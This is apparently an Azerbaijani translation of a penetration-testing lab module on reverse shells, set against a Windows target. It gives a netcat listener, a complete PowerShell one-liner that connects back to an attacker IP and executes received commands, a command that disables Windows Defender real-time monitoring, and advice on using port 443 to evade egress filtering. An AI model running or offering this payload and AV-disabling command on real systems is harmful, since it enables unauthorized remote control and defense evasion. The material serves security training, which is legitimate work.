## Tərs Şelllər (Reverse Shells)

**Tərs şell** (reverse shell) ilə **hücum kompüterimizdə** bir dinləyici (listener) işləyəcək və **hədəf sistem** bizə qoşulmaq üçün əlaqəni **özü başlatmalıdır**.

---

Bu yanaşma, bağlanmış şellin (bind shell) qarşılaşdığı bir çox **təhlükəsizlik maneəsini aşmaq** üçün istifadə edilir. Əksər korporativ şəbəkələrdə daxildən xaricə edilən əlaqələrə (outbound connections) daxil olan əlaqələrdən (inbound connections) daha çox icazə verildiyini nəzərə alsaq, bu üsul üstünlük təşkil edir. Başqa sözlə, hədəf kompüterin öz şəbəkəsindən çıxıb hücum maşınımıza qoşulması, xaricdən gələn bir bağlantını qəbul etməsindən daha asandır.

<img width="2101" height="1219" alt="image" src="https://github.com/user-attachments/assets/2267dda9-9e7e-48b1-b917-d0ef8efe64f7" />

## Tərs Şelllər (Reverse Shells)

Biz zəif sistemlərlə qarşılaşdıqda tez-tez bu cür şelldən istifadə edəcəyik, çünki administratorun gələn əlaqələrə nəzarət etdiyi halda gedən (outbound) əlaqələrə göz yumması ehtimalı yüksəkdir və bu da aşkarlanmamaq üçün daha yaxşı şans verir. Əvvəlki bölmə bağlanmış şelllərin (bind shells) necə server tərəfdəki firewalldan icazə verilən gələn əlaqələrə güvəndiyini müzakirə etdi. Bunu real dünya ssenarisində həyata keçirmək daha çətin olacaq.

Yuxarıdakı şəkildə göründüyü kimi, biz hücum kompüterimizdə tərs şell üçün bir dinləyici işə salırıq və hədəfi bizim hücum kompüterimizlə əlaqəni başlatmağa məcbur etmək üçün bəzi metodlardan (məsələn, **Məhdudiyyətsiz Fayl Yükləmə (Unrestricted File Upload)**, **Əmr İnjeksiya (Command Injection)** və s.) istifadə edirik ki, bu da effektiv şəkildə hücum kompüterimizin **server**, hədəfin isə **müştəri** olmasına səbəb olur.

Tərs şell qurmağa çalışarkən istifadə etmək niyyətində olduğumuz faydalı yüklərin (əmrlər və kod) "təkərini yenidən icad etməyə" həmişə ehtiyacımız yoxdur. İnformasiya təhlükəsizliyi veteranlarının bizə kömək etmək üçün bir araya gətirdiyi faydalı alətlər var. **Tərs Şell Cheat Sheet** (Reverse Shell Cheat Sheet) həm təcrübə edərkən, həm də real icra zamanı istifadə edə biləcəyimiz müxtəlif əmrlərin, kodların və hətta avtomatlaşdırılmış tərs şell generatorlarının siyahısını ehtiva edən fantastik bir mənbədir.

Biz bilməliyik ki, bir çox administrator penetration test edənlərin ümumiyyətlə istifadə etdiyi ictimai depolardan və açıq mənbəli resurslardan xəbərdardır. Onlar hücumdan nə gözləniləcəyinə dair əsas mülahizələrin bir hissəsi kimi bu depolara istinad edə və təhlükəsizlik nəzarətlərini buna uyğun tənzimləyə bilərlər. Bəzi hallarda, hücumlarımızı bir az fərdiləşdirməyimiz lazım gələ bilər.

Gəlin, bu anlayışları daha yaxşı başa düşmək üçün praktiki işlər görək.

-----

## Windows-da Sadə Tərs Şell ilə Praktika

Bu təlimatda biz Windows hədəfində bəzi PowerShell kodu istifadə edərək sadə bir tərs şell quracağıq. Gəlin, hədəfi işə salaq və başlayaq.

Hədəf işə düşərkən, hücum kompüterimizdə bir Netcat dinləyicisi işə sala bilərik.

### Server (Hücum kompüteri)

```
nijatmansimov@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

Bu dəfə dinləyicimiz ilə onu **ümumi porta (443)** bağlayırıq; bu port adətən **HTTPS** bağlantıları üçündür. Biz bu cür ümumi portlardan istifadə etmək istəyə bilərik, çünki dinləyicimizə qoşulmağı başlatdığımızda, onun ƏS firewallu və şəbəkə səviyyəsində **gedən** (outbound) zaman bloklanmamasına əmin olmaq istəyirik. Bir çox tətbiq və təşkilat iş günü ərzində müxtəlif vebsaytlara daxil olmaq üçün HTTPS-ə güvəndiyindən, hər hansı bir təhlükəsizlik komandasının 443 gedən portunu blokladığını görmək nadir hallarda olar. Bununla belə, dərin paket yoxlaması və Layer 7 görünürlüyü qabiliyyətinə malik olan bir firewall, tərs şellin ümumi portda xaricə getdiyini aşkar edib dayandıra bilər, çünki o, yalnız IP ünvanı və portu deyil, həm də şəbəkə paketlərinin məzmununu yoxlayır. Ətraflı firewall yayınması (evasion) bu modulun əhatə dairəsindən kənardır, buna görə də modul boyunca, eləcə də sondakı xüsusi bölmədə aşkarlama və yayınma texnikalarına yalnız qısaca toxunacağıq.

Windows hədəfi işə salındıqdan sonra, RDP istifadə edərək ona qoşulaq.

Windows tərəfdə tərs şelli başlatmaq üçün Netcat istifadə edilə bilər, lakin biz sistemdə hansı tətbiqlərin mövcud olduğuna diqqət yetirməliyik. Netcat Windows sistemlərinə xas (native) deyil, buna görə də Windows tərəfində onu alətimiz kimi istifadə etməyə güvənmək etibarlı olmaya bilər. Daha sonrakı bir bölmədə görəcəyik ki, Windows-da Netcat istifadə etmək üçün biz Netcat ikilik faylını (binary) hədəfə köçürməliyik, bu da başlanğıcdan fayl yükləmə imkanlarımız olmadıqda çətin ola bilər. Beləliklə, giriş əldə etməyə çalışdığımız hədəfə xas olan (yaşadığı yerdən istifadə edən, **living off the land**) istənilən alətlərdən istifadə etmək idealdır.

**Hədəfdə hansı tətbiqlər və şell dilləri yerləşir?**

Bu, tərs şell qurmağa çalışdığımız hər an soruşulmalı əla bir sualdır. Gəlin, bu sadə tərs şelli qurmaq üçün **command prompt** və **PowerShell** istifadə edək. Bu məqamı izah etmək üçün standart bir PowerShell tərs şell bir-sətirlik əmrindən (one-liner) istifadə edə bilərik.

Windows hədəfində, bir command prompt açın və bu əmri kopyalayıb yapışdırın:

### Müştəri (Hədəf)

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Qeyd:** Əgər **Pwnbox** istifadə edirsinizsə, unutmayın ki, bəzi brauzerlər əmri birbaşa hədəfin CLI-nə yapışdırmaq üçün **Mübadilə Buferindən (Clipboard)** istifadə edərkən o qədər də problemsiz işləməyə bilər. Bu hallarda, hədəfdə Notepaddan istifadə edərək əmri Notepada yapışdırmaq, sonra isə hədəfin içindən kopyalayıb yapışdırmaq daha yaxşı olar.

Əmrə diqqətlə baxın və hücum kompüterimizlə tərs şell qurmağımıza imkan verməsi üçün nəyi dəyişməli olduğumuzu düşünün. Bu PowerShell kodu həm də **şell kodu** (shell code) və ya bizim **faydalı yükümüz** adlandırıla bilər. Nümayiş məqsədləri üçün hədəfə tam nəzarət etdiyimizi nəzərə alsaq, bu faydalı yükü Windows sisteminə çatdırmaq olduqca sadə idi. Bu modul irəlilədikcə, faydalı yükü hədəflərə çatdırmaqda çətinliyin artdığını görəcəyik.

**Command prompt-da Enter düyməsini basdıqda nə baş verdi?**

### Müştəri (Hədəf)

```
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

**Windows Defender antivirus** (AV) proqramı kodun icrasını dayandırdı. Bu, tam olaraq nəzərdə tutulduğu kimi işləyir və **müdafiə** baxımından bu bir **uğurdur**. **Hücum** nöqteyi-nəzərindən, qoşulmağa çalışdığımız sistemdə AV aktivləşdirilibsə, aşılması lazım olan bəzi maneələr var. Məqsədlərimiz üçün biz antivirusu **"Virus & threat protection settings"** vasitəsilə və ya inzibati PowerShell konsolunda (sağ klikləyin, administrator kimi çalışdırın) bu əmrdən istifadə edərək **deaktiv etməliyik**:

### AV-ni Deaktiv Etmək

```powershell
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

AV deaktiv edildikdən sonra, kodu yenidən icra etməyə cəhd edin.

### Server (Hücum kompüteri)

```
nijatmansimov@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

Hücum kompüterimizə qayıtdıqda, tərs şelli uğurla qurduğumuzu görərik. Bunu **`PS`** ilə başlayan sorğunun dəyişməsindən və ƏS və fayl sistemi ilə qarşılıqlı əlaqədə olmaq qabiliyyətimizdən görə bilərik. Biraz praktika etmək üçün bəzi standart Windows əmrlərini işə salmağa cəhd edin.



















